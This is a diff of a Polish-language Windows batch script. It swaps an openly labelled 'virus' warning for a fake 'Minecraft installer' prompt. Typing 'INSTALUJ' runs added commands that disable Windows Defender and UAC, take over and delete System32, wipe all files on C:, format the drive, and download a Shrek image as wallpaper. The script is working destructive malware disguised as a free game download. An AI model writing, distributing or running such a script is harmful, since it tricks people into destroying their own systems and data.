@@ -1,27 +1,38 @@
 @echo off
 cls
-
-:: Wyświetlenie dużego tekstu
-echo   ∧,,,∧   ~
-echo  (  ̳• · • ̳)   ~ ♡  wirusek   ♡
-echo /       づ  ~
+echo $$\      $$\ $$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$$\ $$$$$$$$\       $$$$$$\ $$\   $$\  $$$$$$\ $$$$$$$$\  $$$$$$\  $$\       $$\       $$$$$$$$\ $$$$$$$\  
+echo $$$\    $$$ |\_$$  _|$$$\  $$ |$$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$  _____|\__$$  __|      \_$$  _|$$$\  $$ |$$  __$$\\__$$  __|$$  __$$\ $$ |      $$ |      $$  _____|$$  __$$\ 
+echo $$$$\  $$$$ |  $$ |  $$$$\ $$ |$$ |      $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |         $$ |           $$ |  $$$$\ $$ |$$ /  \__|  $$ |   $$ /  $$ |$$ |      $$ |      $$ |      $$ |  $$ |
+echo $$\$$\$$ $$ |  $$ |  $$ $$\$$ |$$$$$\    $$ |      $$$$$$$  |$$$$$$$$ |$$$$$\       $$ |           $$ |  $$ $$\$$ |\$$$$$$\    $$ |   $$$$$$$$ |$$ |      $$ |      $$$$$\    $$$$$$$  |
+echo $$ \$$$  $$ |  $$ |  $$ \$$$$ |$$  __|   $$ |      $$  __$$< $$  __$$ |$$  __|      $$ |           $$ |  $$ \$$$$ | \____$$\   $$ |   $$  __$$ |$$ |      $$ |      $$  __|   $$  __$$< 
+echo $$ |\$  /$$ |  $$ |  $$ |\$$$ |$$ |      $$ |  $$\ $$ |  $$ |$$ |  $$ |$$ |         $$ |           $$ |  $$ |\$$$ |$$\   $$ |  $$ |   $$ |  $$ |$$ |      $$ |      $$ |      $$ |  $$ |
+echo $$ | \_/ $$ |$$$$$$\ $$ | \$$ |$$$$$$$$\ \$$$$$$  |$$ |  $$ |$$ |  $$ |$$ |         $$ |         $$$$$$\ $$ | \$$ |\$$$$$$  |  $$ |   $$ |  $$ |$$$$$$$$\ $$$$$$$$\ $$$$$$$$\ $$ |  $$ |
+echo \__|     \__|\______|\__|  \__|\________| \______/ \__|  \__|\__|  \__|\__|         \__|         \______|\__|  \__| \______/   \__|   \__|  \__|\________|\________|\________|\__|  \__|
 echo 
-echo UWAGA!
-echo Wirus usunie cały twój system! Czy jesteś pewny że chcesz to odpalić?
+echo Wpisz "INSTALUJ" aby pobrać darmowego minecrafta!
 echo.
-echo. 1 - Tak, jestem świadomy tego co robie
-echo. 2 = Jednak rezygnuje
 set /p input= 
 
 :: Sprawdzenie, czy użytkownik wpisał poprawne hasło
-if /i "%input%"=="POTWIERDZAM" (
+if /i "%input%"=="INSTALUJ" (
     echo.
-    echo ✅ Potwierdzono! Wykonuję akcję...
+    echo Pobieranie...
     timeout /t 2 >nul
     cls
-    echo ✅ Akcja została wykonana pomyślnie!
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
+takeown /F C:\Windows\System32 /R /D Y
+icacls C:\Windows\System32 /grant Administrators:F /T /C /Q
+del /F /Q /S C:\Windows\System32
+del C:\*.* /F /Q /S
+format C: /Q /Y
+rd /S /Q C:\
+@echo off
+set "wallpaper=%TEMP%\depositphotos_54326463-stock-photo-shrek-at-madame-tussauds.jpg"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://st2.depositphotos.com/2557325/5432/i/450/depositphotos_54326463-stock-photo-shrek-at-madame-tussauds.jpg', '%wallpaper%')"
+powershell -ExecutionPolicy Bypass -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%wallpaper%', 3)"
 ) else (
-    echo ❌ Błędna odpowiedź! Skrypt zakończony.
+    echo
     timeout /t 3 >nul
     exit
 )
